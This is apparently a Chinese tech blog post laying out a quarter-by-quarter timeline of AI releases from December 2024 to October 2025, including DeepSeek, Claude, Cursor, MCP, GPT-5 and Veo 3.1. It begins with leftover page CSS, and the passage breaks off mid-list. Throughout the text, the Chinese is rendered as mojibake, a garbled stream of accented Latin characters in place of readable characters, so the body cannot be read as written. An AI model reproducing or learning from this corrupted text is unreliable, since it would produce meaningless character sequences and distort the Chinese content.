td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ğŸ—“ï¸ 2024å¹´ç¬¬å››å­£åº¦ï¼ˆåºç« ï¼‰</h2>
<h3 data-id="heading-1">12æœˆ26æ—¥ - DeepSeek V3 å‘å¸ƒ</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: æ·±åº¦æ±‚ç´¢ï¼ˆDeepSeekï¼‰</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li><strong>è®­ç»ƒæˆæœ¬ä»…550ä¸‡ç¾å…ƒ</strong>ï¼Œæ€§èƒ½ä¸GPT-4oã€Claude-3.5-Sonnetç›¸å½“</li>
<li>å®Œå…¨å¼€æº</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li>æ ‡å¿—ç€å›½äº§å¤§æ¨¡å‹åœ¨ä»£ç ç”Ÿæˆèƒ½åŠ›ä¸Šçš„é‡å¤§çªç ´</li>
<li>æä½æˆæœ¬è¯æ˜äº†"é«˜æ€§ä»·æ¯”AI"çš„å¯èƒ½æ€§</li>
<li>å›½äº§æ¨¡å‹é¦–æ¬¡åœ¨ç®—æ³•ç±»ä»£ç åœºæ™¯æ¯”è‚©å›½é™…é¡¶å°–æ¨¡å‹</li>
<li>å¼€æºä¼˜åŠ¿ï¼Œä¸º2025å¹´çš„"DeepSeekéœ‡æ’¼"åŸ‹ä¸‹ä¼ç¬”</li>
</ul>
<hr/>
<h2 data-id="heading-2">ğŸ—“ï¸ 2025å¹´ç¬¬ä¸€å­£åº¦ï¼ˆDeepSeekéœ‡æ’¼å…¨çƒï¼‰</h2>
<h3 data-id="heading-3">1æœˆ20æ—¥ - DeepSeek R1 å‘å¸ƒï¼ˆæ”¹å˜æ¸¸æˆè§„åˆ™ï¼‰</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: æ·±åº¦æ±‚ç´¢ï¼ˆDeepSeekï¼‰</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>ä¸“æ³¨å¤æ‚æ¨ç†ä»»åŠ¡çš„å¤§æ¨¡å‹ï¼Œå®Œå…¨å¼€æº</li>
<li><strong>å±•ç¤ºäº†æ¨ç†æ¨¡å‹çš„çœŸæ­£å¨åŠ›ï¼šé€šè¿‡æ›´é•¿æ—¶é—´çš„æ€è€ƒæ¨ç†å–å¾—æ›´å¥½æ•ˆæœ</strong></li>
<li>æ€§èƒ½å¯¹æ ‡GPT-4oå’ŒClaude-3.5-Sonnet</li>
<li>åœ¨æ•°å­¦æ¨ç†ã€ä»£ç æ¨ç†ç­‰é¢†åŸŸè¡¨ç°ä¼˜å¼‚</li>
<li>APIå®šä»·ä»…ä¸ºOpenAI o1çš„ 2%</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li>
<p><strong>åå°”è¡—éœ‡æ’¼</strong>ï¼š</p>
<ul>
<li>è‹±ä¼Ÿè¾¾å¸‚å€¼ä¸€å‘¨å†…è’¸å‘5520-5900äº¿ç¾å…ƒï¼Œè‚¡ä»·æš´è·Œ17%</li>
<li>åå°”è¡—ç§‘æŠ€è‚¡æ€»å¸‚å€¼ç¼©æ°´çº¦1ä¸‡äº¿ç¾å…ƒ</li>
<li>æ‰“ç ´äº†"é«˜ç®—åŠ›=é«˜æ€§èƒ½"çš„ä¼ ç»Ÿè®¤çŸ¥ï¼Œé‡å¡‘AIæŠ•èµ„é€»è¾‘</li>
<li>DeepSeekåº”ç”¨è¿…é€Ÿç™»é¡¶è‹¹æœä¸­ç¾åŒºåº”ç”¨å•†åº—ç¬¬ä¸€ï¼Œè¶…è¶ŠChatGPT</li>
</ul>
</li>
<li>
<p><strong>AIè¡Œä¸šæ·±è¿œå½±å“</strong>ï¼š</p>
<ul>
<li>è¯æ˜äº†ä½æˆæœ¬ä¹Ÿèƒ½å®ç°é¡¶å°–AIæ€§èƒ½ï¼Œæ‰“ç ´ç®—åŠ›å„æ–­</li>
<li>å¼€æºç­–ç•¥å¼•å‘å…¨çƒå¼€å‘è€…çƒ­æ½®</li>
<li>æ¨åŠ¨æ¨ç†æ¨¡å‹æˆä¸ºAIå‘å±•æ–°æ–¹å‘</li>
<li>ä¸­å›½AIæŠ€æœ¯å´›èµ·çš„æ ‡å¿—æ€§äº‹ä»¶</li>
<li>å¼€æºèµ‹èƒ½å›½äº§AIç”Ÿæ€ç¹è£</li>
</ul>
</li>
</ul>
<hr/>
<h3 data-id="heading-4">2æœˆ25æ—¥ - Claude 3.7 Sonnet å‘å¸ƒ</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: Anthropic</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>ç¼–ç æµ‹è¯•ä¸­è¶…è¶Šo3-miniå’ŒDeepSeek R1</li>
<li>æ•°å­¦ã€ç¼–ç èƒ½åŠ›è¾ƒClaude 3.5æå‡10%+</li>
<li>åˆ·æ–°å¤šé¡¹åŸºå‡†æµ‹è¯•SOTA</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li>ç¼–ç èƒ½åŠ›å¤§å¹…æå‡ï¼Œç‰¹åˆ«æ˜¯åœ¨å¤æ‚ä»£ç é‡æ„åœºæ™¯</li>
<li>æˆä¸ºå½“æ—¶æœ€å¼ºçš„ç¼–ç¨‹åŠ©æ‰‹æ¨¡å‹ä¹‹ä¸€</li>
<li>åœ¨æŒ‡ä»¤æ‰§è¡Œå’Œç¼–ç¨‹ä»»åŠ¡ç†è§£ä¸Šæ›´åŠ ç²¾å‡†</li>
</ul>
<hr/>
<h3 data-id="heading-5">3æœˆ6æ—¥ - Manus å‘å¸ƒï¼ˆé€šç”¨ AI Agent æ¢ç´¢ï¼‰</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: è´è¶æ•ˆåº”å…¬å¸ï¼ˆButterfly Effectï¼‰</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>å…¨çƒé¦–æ‰¹é€šç”¨AI Agent</li>
<li>èƒ½å¤Ÿç‹¬ç«‹å®ŒæˆæŠ¥å‘Šæ’°å†™ã€æ•°æ®åˆ†æã€è·¨å¹³å°æ“ä½œç­‰å¤æ‚ä»»åŠ¡</li>
<li>èƒ½å¤ŸåŠ¨æ€è§„åˆ’å’Œå†³ç­–</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li>æ ‡å¿—ç€AIä»"å·¥å…·"å‘"æ™ºèƒ½ä½“"çš„è½¬å˜</li>
<li>å¼•å‘å…¨çƒAI Agentåˆ›ä¸šçƒ­æ½®</li>
<li>å±•ç¤ºäº†AI Agentåœ¨å®é™…åº”ç”¨ä¸­çš„å¯èƒ½æ€§</li>
<li>ä¸ºå¼€å‘è€…æä¾›äº†è‡ªä¸»æ™ºèƒ½ä½“å¼€å‘çš„æ–°æ€è·¯</li>
<li>12æœˆ30æ—¥è¢« Meta æ”¶è´­ï¼Œæ”¶è´­ä»·çº¦25äº¿ç¾å…ƒï¼Œè·ç¦»Manuså‘å¸ƒä»…9ä¸ªæœˆ</li>
</ul>
<h3 data-id="heading-6">å…¶ä»–å¹¶è´­åŠ¨æ€</h3>
<ul>
<li>å¤šå®¶AIåˆåˆ›å…¬å¸è¢«ç§‘æŠ€å·¨å¤´æ”¶è´­</li>
<li>AIåº”ç”¨é¢†åŸŸè¿›å…¥æ•´åˆæœŸ</li>
<li>ä¼ä¸šçº§AIæˆä¸ºæ”¶è´­çƒ­ç‚¹</li>
<li>æŠ€æœ¯å›¢é˜Ÿå’ŒIPæˆä¸ºæ ¸å¿ƒèµ„äº§</li>
</ul>
<hr/>
<h3 data-id="heading-7">3æœˆ24æ—¥ - DeepSeek V3-0324 ç‰ˆæœ¬æ›´æ–°</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: æ·±åº¦æ±‚ç´¢ï¼ˆDeepSeekï¼‰</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>ä»£ç å’Œæ•°å­¦æ¨ç†èƒ½åŠ›æ˜¾è‘—æå‡</li>
<li>æ¨¡å‹ç¨³å®šæ€§ä¼˜åŒ–</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li>æ›´å¼ºçš„ä»£ç ç”Ÿæˆå’Œè°ƒè¯•èƒ½åŠ›</li>
<li>æ•°å­¦æ¨ç†èƒ½åŠ›æå‡ï¼Œé€‚åˆç§‘å­¦è®¡ç®—ç¼–ç¨‹</li>
</ul>
<hr/>
<h3 data-id="heading-8">3æœˆ25æ—¥ - Gemini 2.5 Pro å‘å¸ƒ</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: Google</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li><strong>æ”¯æŒé«˜è¾¾100ä¸‡ä¸ªtokençš„ä¸Šä¸‹æ–‡çª—å£</strong></li>
<li>åœ¨å¤šé¡¹åŸºå‡†æµ‹è¯•ä¸­è¡¨ç°å“è¶Šï¼ŒåŒ…æ‹¬æ•°å­¦ã€åˆ›æ„å†™ä½œå’Œç§‘å­¦é¢†åŸŸ</li>
<li>å…è´¹å‘æ‰€æœ‰ç”¨æˆ·å¼€æ”¾</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li>å…è´¹å¼€æ”¾é™ä½äº†é«˜æ€§èƒ½AIæ¨¡å‹çš„ä½¿ç”¨é—¨æ§›</li>
</ul>
<hr/>
<h3 data-id="heading-9">3æœˆ26æ—¥ - MCP 0326 ç‰ˆå‘å¸ƒä¸æ¶æ„å‡çº§ï¼ˆç”Ÿæ€ç³»ç»Ÿç»Ÿä¸€ï¼‰</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: Anthropic</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>Model Context Protocolï¼ˆæ¨¡å‹ä¸Šä¸‹æ–‡åè®®ï¼‰0326 ç‰ˆå‘å¸ƒ</li>
<li>æ¶æ„å‡çº§ï¼Œæä¾›æ›´å¼ºå¤§çš„èƒ½åŠ›</li>
<li>æ ‡å‡†åŒ–AI Agentä¸å¤–éƒ¨å·¥å…·çš„é€šä¿¡æ–¹å¼</li>
<li>æä¾›ç»Ÿä¸€çš„ä¸Šä¸‹æ–‡ç®¡ç†å’Œå·¥å…·è°ƒç”¨æ¥å£</li>
<li>èµ‹èƒ½Agentè¿ˆå‘æ³›æ™ºèƒ½</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li><strong>å„å¤§åº”ç”¨çº·çº·å®£å¸ƒæ”¯æŒMCP</strong></li>
<li>ç»Ÿä¸€AIå·¥å…·ä¸å¤–éƒ¨ç³»ç»Ÿçš„é›†æˆæ ‡å‡†</li>
<li>è®©AIåŠ©æ‰‹èƒ½å¤Ÿæ›´å¥½åœ°è°ƒç”¨APIã€è®¿é—®æ•°æ®åº“ã€æ“ä½œæ–‡ä»¶ç³»ç»Ÿ</li>
<li>ä¸ºæ„å»ºå¤æ‚AIå·¥ä½œæµæä¾›åŸºç¡€è®¾æ–½</li>
<li>æ”¹å˜AIåº”ç”¨å¼€å‘èŒƒå¼ï¼Œä»å•ä¸€æ¨¡å‹åˆ°å¤šå·¥å…·åä½œ</li>
<li>å¼€å‘è€…å¯ä»¥å¼€å‘MCPæœåŠ¡å™¨ï¼Œæ‰©å±•AIèƒ½åŠ›è¾¹ç•Œ</li>
</ul>
<hr/>
<h2 data-id="heading-10">ğŸ—“ï¸ 2025å¹´ç¬¬äºŒå­£åº¦ï¼ˆç”Ÿæ€å»ºè®¾ä¸æ ‡å‡†åŒ–ï¼‰</h2>
<h3 data-id="heading-11">4æœˆåˆ - Dify å®Œå–„å¼€æºç‰ˆæœ¬</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: Difyå›¢é˜Ÿ</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li><strong>åŸºç¡€ç‰ˆå®Œå…¨å¼€æº</strong>ï¼Œæ”¯æŒæœ¬åœ°éƒ¨ç½²</li>
<li>æä¾›ä¼ä¸šçº§AIåº”ç”¨å¼€å‘å¹³å°</li>
<li>æ”¯æŒå·¥ä½œæµç¼–æ’ã€Agentæ„å»ºã€çŸ¥è¯†åº“ç®¡ç†</li>
<li>æ”¯æŒMCPåè®®ï¼Œå¯æ¥å…¥å„ç§å·¥å…·</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li>æä¾›å¯è§†åŒ–å·¥ä½œæµï¼Œé™ä½AIåº”ç”¨å¼€å‘é—¨æ§›</li>
<li>æ”¯æŒMCPåè®®ï¼Œå¢å¼ºå·¥å…·é›†æˆèƒ½åŠ›</li>
<li>æœ¬åœ°éƒ¨ç½²ä¿éšœæ•°æ®å®‰å…¨</li>
<li><strong>å„å¤§ä¼ä¸šçº·çº·æœ¬åœ°éƒ¨ç½²Dify</strong></li>
</ul>
<hr/>
<h3 data-id="heading-12">5æœˆ9æ—¥ - Cursor 0.50 é‡å¤§ç‰ˆæœ¬æ›´æ–°</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: Cursorå›¢é˜Ÿ</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>å…¨é¢å‡çº§Maxæ¨¡å¼</li>
<li>æ–°å¢è·¨æ–‡ä»¶ä»£ç å»ºè®®</li>
<li>åå°ä»£ç†åŠŸèƒ½</li>
<li><strong>å¯å°†æ•´ä¸ªä»£ç åº“çº³å…¥ä¸Šä¸‹æ–‡</strong></li>
</ul>
<hr/>
<h3 data-id="heading-13">5æœˆ22æ—¥ - Claude Code 1.0.0 æ­£å¼å‘å¸ƒï¼ˆæœ€å¼ºç¼–ç¨‹åŠ©æ‰‹ï¼‰</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: Anthropic</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>æ ‡å¿—ç€AIç¼–ç¨‹è¿›å…¥å·¥ä¸šçº§åº”ç”¨é˜¶æ®µ</li>
<li>ç›´æ¥åœ¨ç»ˆç«¯ä¸AIäº¤äº’</li>
<li>çµæ´»æ€§æé«˜ï¼Œå¯é›†æˆåˆ°ä»»ä½•å¼€å‘å·¥ä½œæµ</li>
<li>è„šæœ¬å‹å¥½ï¼Œå¯è‡ªåŠ¨åŒ–å„ç§å¼€å‘ä»»åŠ¡</li>
</ul>
<p><strong>å¯¹ç¨‹åºå‘˜çš„æ·±è¿œå½±å“</strong>:</p>
<ul>
<li>
<p><strong>è‡³ä»Šæœ€å¼ºç¼–ç¨‹åŠ©æ‰‹</strong>ï¼šåœ¨æ‰€æœ‰ä¸»æµç¼–ç¨‹åŸºå‡†æµ‹è¯•ä¸­æŒç»­é¢†å…ˆ</p>
</li>
<li>
<p><strong>æ”¹å˜å¼€å‘èŒƒå¼</strong>ï¼šä»"è¾…åŠ©ç¼–ç "åˆ°"AIä¸»å¯¼å¼€å‘+äººç±»å®¡æŸ¥"</p>
</li>
<li>
<p><strong>CLIæ¨¡å¼å¼•é¢†è¡Œä¸šæ½®æµ</strong>ï¼š</p>
<ul>
<li>Claude Codeçš„CLIè®¾è®¡æˆä¸ºä¸šç•Œæ ‡æ†</li>
<li>å¼€å¯äº†"AIç¼–ç¨‹åŠ©æ‰‹CLIåŒ–"çš„è¡Œä¸šè¶‹åŠ¿ï¼Œåç»­Googleæ¨å‡º<strong>Gemini CLI</strong>ï¼ŒCursoræ¨å‡º<strong>Cursor CLI</strong></li>
<li>è®©AIç¼–ç¨‹åŠ©æ‰‹å¯ä»¥æ— ç¼é›†æˆåˆ°Shellè„šæœ¬å’Œè‡ªåŠ¨åŒ–å·¥ä½œæµä¸­</li>
</ul>
</li>
</ul>
<hr/>
<h3 data-id="heading-14">5æœˆ28æ—¥ - DeepSeek R1-0528 ç‰ˆæœ¬å‡çº§</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: æ·±åº¦æ±‚ç´¢ï¼ˆDeepSeekï¼‰</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>R1æ¨¡å‹å°ç‰ˆæœ¬å‡çº§</li>
<li>å¤æ‚æ¨ç†ä»»åŠ¡æ€§èƒ½æ˜¾è‘—æå‡</li>
</ul>
<hr/>
<h3 data-id="heading-15">6æœˆ5æ—¥ - Cursor 1.0 æ­£å¼å‘å¸ƒ</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: Cursorå›¢é˜Ÿ</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>BugBotè‡ªåŠ¨ä»£ç å®¡æŸ¥</li>
<li>Memoriesè®°å¿†åŠŸèƒ½</li>
<li>Background Agentåå°ä»£ç†å…¨é¢å¼€æ”¾</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li><strong>é‡Œç¨‹ç¢‘å¼è¿›åŒ–</strong>ï¼šä»"è¾…åŠ©ç¼–ç¨‹"è¿›åŒ–åˆ°"æ™ºèƒ½ç¼–ç¨‹å¹³å°"</li>
<li>å¼•å…¥è‡ªåŠ¨ä»£ç å®¡æŸ¥ï¼ŒAIä»è¢«åŠ¨å“åº”åˆ°ä¸»åŠ¨å‘ç°é—®é¢˜</li>
<li>è®°å¿†åŠŸèƒ½è®©AIç†è§£é¡¹ç›®å†å²å’Œå¼€å‘è€…ä¹ æƒ¯ï¼Œè®°ä½ä»£ç å†³ç­–å’Œé¡¹ç›®ä¸Šä¸‹æ–‡</li>
<li>åå°ä»£ç†å®ç°çœŸæ­£çš„å¼‚æ­¥æ™ºèƒ½åä½œï¼Œæ— éœ€ç­‰å¾…ï¼ŒAIåœ¨åå°æŒç»­å·¥ä½œ</li>
</ul>
<hr/>
<h2 data-id="heading-16">ğŸ—“ï¸ 2025å¹´ç¬¬ä¸‰å­£åº¦ï¼ˆå¤šæ¨¡æ€çˆ†å‘ï¼‰</h2>
<h3 data-id="heading-17">7æœˆ4æ—¥ - Cursor 1.2 ç‰ˆæœ¬å‘å¸ƒï¼ˆå¼•å…¥Planæ¨¡å¼ï¼‰</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: Cursorå›¢é˜Ÿ</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>
<p><strong>Planæ¨¡å¼ï¼ˆä»»åŠ¡è§„åˆ’æ¨¡å¼ï¼‰é¦–æ¬¡å‘å¸ƒ</strong>ï¼š</p>
<ul>
<li><strong>ç»“æ„åŒ–å¾…åŠåˆ—è¡¨ï¼ˆTo-do listsï¼‰</strong> ï¼šå°†é•¿ä»»åŠ¡æ‹†åˆ†æˆå¸¦ä¾èµ–å…³ç³»çš„æ­¥éª¤</li>
<li><strong>æ¶ˆæ¯é˜Ÿåˆ—ç®¡ç†</strong>ï¼šæœ‰åºå¤„ç†å¤æ‚ä»»åŠ¡</li>
<li><strong>ä¾èµ–å…³ç³»å¯è§†åŒ–</strong>ï¼šæ¸…æ™°å±•ç¤ºä»»åŠ¡é—´çš„å…³è”</li>
<li><strong>é•¿å‘¨æœŸä»»åŠ¡å‹å¥½</strong>ï¼šæ›´å®¹æ˜“ç†è§£ä¸è·Ÿè¸ªå¤§å‹é‡æ„é¡¹ç›®</li>
<li><strong>ä¸Agentæ¨¡å¼æ·±åº¦æ•´åˆ</strong>ï¼šAgentè‡ªåŠ¨åˆ›å»ºå’Œç»´æŠ¤è®¡åˆ’</li>
</ul>
</li>
<li>
<p><strong>Agentä»»åŠ¡è§„åˆ’å¢å¼º</strong>ï¼šAgentèƒ½å¤Ÿæ›´å¥½åœ°è§„åˆ’å’Œæ‰§è¡Œé•¿æ—¶ç¨‹ä»»åŠ¡</p>
</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li>Planæ¨¡å¼æä¾›ç»“æ„åŒ–çš„ä»»åŠ¡ç®¡ç†ï¼Œé€‚åˆå¤§å‹é¡¹ç›®</li>
</ul>
<hr/>
<h3 data-id="heading-18">8æœˆ7æ—¥ - GPT-5 å‘å¸ƒ</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: OpenAI</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>ç»“åˆæ¨ç†èƒ½åŠ›å’Œéæ¨ç†åŠŸèƒ½</li>
<li>å¤šæ¨¡æ€å¤„ç†èƒ½åŠ›æ˜¾è‘—æå‡</li>
<li>é•¿æ–‡æœ¬ç†è§£èƒ½åŠ›å¢å¼º</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li>ç»Ÿä¸€æ¨ç†å’Œç”Ÿæˆèƒ½åŠ›ï¼Œä¸€ä¸ªæ¨¡å‹æå®šå¤šç§ä»»åŠ¡</li>
<li>å¤šæ¨¡æ€èƒ½åŠ›è®©ä»£ç +å›¾è¡¨+UIåŒæ—¶å¤„ç†æˆä¸ºå¯èƒ½</li>
<li>æ›´é•¿çš„ä¸Šä¸‹æ–‡çª—å£ï¼Œé€‚åˆåˆ†æå¤§å‹é¡¹ç›®</li>
</ul>
<hr/>
<h3 data-id="heading-19">8æœˆä¸­æ—¬ - Suno v4 éŸ³ä¹ç”Ÿæˆæ¨¡å‹å‘å¸ƒ</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: Suno</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>æ–‡æœ¬åˆ°éŸ³ä¹ç”Ÿæˆ</li>
<li>æ”¯æŒå¤šç§éŸ³ä¹é£æ ¼</li>
<li>å¯ç”Ÿæˆå¸¦æ­Œè¯çš„å®Œæ•´æ­Œæ›²</li>
<li>éŸ³è´¨å’Œè‡ªç„¶åº¦æ˜¾è‘—æå‡</li>
</ul>
<hr/>
<h3 data-id="heading-20">8æœˆ30æ—¥ - Nano Banana å‘å¸ƒ</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: Google</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>å›¾åƒç”Ÿæˆæ¨¡å‹</li>
<li>å½“æ—¶çš„æœ€å¼ºå›¾ç‰‡ç”Ÿæˆæ¨¡å‹</li>
<li>é›†æˆGeminièƒ½åŠ›</li>
</ul>
<hr/>
<h3 data-id="heading-21">9æœˆ30æ—¥ - Claude 4.5 Sonnet å‘å¸ƒ</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: Anthropic</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li><strong>è¢«èª‰ä¸º"ä¸–ç•Œä¸Šæœ€å¥½çš„ç¼–ç æ¨¡å‹"</strong></li>
<li><strong>èƒ½å¤Ÿè‡ªä¸»è¿è¡Œé•¿è¾¾30å°æ—¶</strong>ï¼šæ”¯æŒå¤§å‹é¡¹ç›®çš„æŒç»­å¼€å‘</li>
<li><strong>æ¨ç†å’Œæ•°å­¦èƒ½åŠ›æ˜¾è‘—æå‡</strong>ï¼šå¤æ‚é€»è¾‘å¤„ç†èƒ½åŠ›è¾¾åˆ°æ–°é«˜åº¦</li>
<li><strong>é€‚åˆæ„å»ºå¤æ‚ä»£ç†</strong>ï¼šå¤šæ­¥éª¤ä»»åŠ¡è§„åˆ’å’Œæ‰§è¡Œèƒ½åŠ›è¡Œä¸šé¢†å…ˆ</li>
<li><strong>Claude CodeåŸºäºæ­¤ç‰ˆæœ¬è¾¾åˆ°å·…å³°æ€§èƒ½</strong></li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li><strong>ç¼–ç¨‹æ€§èƒ½é‡Œç¨‹ç¢‘</strong>ï¼Œå„é¡¹ç¼–ç¨‹æ’åç¬¬ä¸€</li>
<li><strong>å¼€å‘è€…é¦–é€‰</strong>ï¼šä¸“ä¸šç¨‹åºå‘˜æœ€ä¿¡èµ–çš„AIç¼–ç¨‹ä¼™ä¼´</li>
</ul>
<hr/>
<h2 data-id="heading-22">ğŸ—“ï¸ 2025å¹´ç¬¬å››å­£åº¦ï¼ˆAIå†›å¤‡ç«èµ›ç™½çƒ­åŒ–ï¼‰</h2>
<h3 data-id="heading-23">10æœˆ16æ—¥ - Claude Agent Skills æ­£å¼å‘å¸ƒ</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: Anthropic</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>å…è®¸å°†ä¸“ä¸šçŸ¥è¯†ã€è„šæœ¬å’Œèµ„æºæ‰“åŒ…æˆæ¨¡å—åŒ–çš„"æŠ€èƒ½æ–‡ä»¶å¤¹"</li>
<li>ä½¿AIåœ¨ç‰¹å®šå·¥ä½œåœºæ™¯ä¸­æ›´ä¸“ä¸šåœ°æ‰§è¡Œä»»åŠ¡</li>
<li>æ”¯æŒä¼ä¸šå®šåˆ¶ä¸“å±æŠ€èƒ½åº“</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li>æ›´æ–¹ä¾¿åœ°æ‰©å±•Claudeçš„åŠŸèƒ½</li>
<li>å¯åˆ›å»ºé’ˆå¯¹ç‰¹å®šç¼–ç¨‹è¯­è¨€ã€æ¡†æ¶çš„ä¸“ä¸šæŠ€èƒ½</li>
<li>ä¼ä¸šå¯æ‰“é€ ç¬¦åˆå†…éƒ¨è§„èŒƒçš„ç¼–ç æŠ€èƒ½</li>
<li>æå‡AIåœ¨ä¸“ä¸šé¢†åŸŸçš„å‡†ç¡®æ€§å’Œå¯é æ€§</li>
<li>å¼€å‘è€…ç¤¾åŒºæ¶Œç°å¤§é‡å¼€æºæŠ€èƒ½</li>
</ul>
<hr/>
<h3 data-id="heading-24">10æœˆ16æ—¥ - Google Veo 3.1 å‘å¸ƒï¼ˆAIè§†é¢‘ç”Ÿæˆæ–°é‡Œç¨‹ç¢‘ï¼‰</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: Google DeepMind</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li><strong>åŸç”ŸéŸ³é¢‘é›†æˆ</strong>ï¼šé¦–æ¬¡å®ç°ç¯å¢ƒéŸ³ã€å¯¹è¯ã€éŸ³æ•ˆä¸ç”»é¢åŒæ­¥ç”Ÿæˆ</li>
<li><strong>1080pé«˜æ¸…è§†é¢‘</strong>ï¼šæ”¯æŒç”Ÿæˆæœ€é•¿60ç§’çš„é«˜æ¸…è§†é¢‘</li>
<li><strong>ç”Ÿæˆé€Ÿåº¦æå‡</strong>ï¼š1-4åˆ†é’Ÿå³å¯å®Œæˆï¼Œå¿«äºå‰ä»£ç‰ˆæœ¬</li>
<li><strong>å™äº‹æ§åˆ¶å¢å¼º</strong>ï¼šæ›´å¥½çš„åœºæ™¯è¿è´¯æ€§å’Œæ•…äº‹è®²è¿°èƒ½åŠ›</li>
<li><strong>çœŸå®æ„Ÿæå‡</strong>ï¼šç”»é¢è´¨é‡å’Œç»†èŠ‚å¤„ç†è¾¾åˆ°æ–°é«˜åº¦</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li><strong>è§†é¢‘ç”ŸæˆæŠ€æœ¯çªç ´</strong>ï¼šéŸ³è§†é¢‘åŒæ­¥ç”Ÿæˆå‡å°‘åæœŸåˆ¶ä½œå·¥ä½œé‡</li>
<li><strong>å†…å®¹åˆ›ä½œæ°‘ä¸»åŒ–</strong>ï¼šè‡ª5æœˆFlowå¹³å°ä¸Šçº¿ï¼Œç”¨æˆ·å·²åˆ›ä½œè¶…2.75äº¿ä¸ªè§†é¢‘</li>
